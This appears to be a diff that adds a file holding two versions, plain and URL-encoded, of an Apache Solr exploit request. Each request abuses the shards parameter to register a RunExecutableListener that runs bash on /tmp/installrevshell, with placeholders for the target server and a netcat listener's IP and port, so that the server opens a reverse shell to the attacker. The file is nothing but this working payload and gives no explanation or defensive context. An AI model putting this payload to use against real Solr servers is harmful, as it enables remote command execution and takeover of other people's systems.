@@ -1,0 +1,4 @@
+http://IP_OF_SOLR_SERVER:8983/solr/NAME_OF_COLECTION/select?q=xxx&shards=localhost:8983/solr/NAME_OF_COLECTION/config%23&stream.body={"update-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-e","/tmp/installrevshell","IP_OF_NETCAT_LISTENER","PORT_OF_NETCAT_LISTENER"]}}&isShard=true
+
+
+http://IP_OF_SOLR_SERVER:8983/solr/NAME_OF_COLECTION/select?q=xxx&shards=localhost:8983/solr/NAME_OF_COLECTION/config%23&stream.body={%22update-listener%22:{%22event%22:%22postCommit%22,%22name%22:%22newlistener%22,%22class%22:%22solr.RunExecutableListener%22,%22exe%22:%22bash%22,%22dir%22:%22/bin/%22,%22args%22:[%22-e%22,%22/tmp/installrevshell%22,%22IP_OF_NETCAT_LISTENER%22,%22PORT_OF_NETCAT_LISTENER%22]}}&isShard=true
